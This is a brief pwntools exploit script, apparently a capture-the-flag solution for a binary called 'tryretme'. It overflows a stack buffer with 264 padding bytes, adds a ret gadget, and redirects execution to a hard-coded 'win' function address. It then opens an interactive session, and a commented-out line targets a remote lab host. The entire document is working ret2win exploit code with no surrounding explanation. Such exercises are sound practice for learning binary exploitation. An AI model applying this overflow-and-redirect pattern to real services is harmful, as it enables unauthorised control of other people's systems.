from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

p = process(b"./tryretme")
# gdb.attach(p, api=True)
# p = remote(b"10.201.69.19", 9006)
# e = ELF(b"./tryretme")

# win = e.symbols["win"]
win = 0x4011DD
ret = 0x40101A

payload = b"A" * 264
payload += p64(ret)
payload += p64(win)
p.recvuntil(b" : \n")
p.sendline(payload)
p.interactive()
